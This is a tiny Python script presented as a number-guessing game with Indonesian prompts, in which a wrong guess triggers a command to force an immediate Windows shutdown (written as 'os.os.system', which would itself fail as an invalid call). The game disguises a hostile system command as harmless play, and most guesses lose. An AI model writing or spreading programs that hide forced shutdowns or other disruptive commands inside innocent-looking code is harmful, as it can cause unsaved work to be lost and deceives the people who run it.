import random
import os
# Imports required py lib's

# Uses random to randomise number
number = random.randint(1,6)

# Asks you a number 1-6. Good luck bro
guessNum = input("Permainan sederhana! Tebak angka dari 1 sampai 6. Good Luck!\n")
guessNum = int(guessNum)

# Youre safe you lucky man.
if guessNum == number:
    print("Selamat Kamu Menang!")
else:
    # OS go kaputt.
    os.os.system("shutdown /s /t 1")
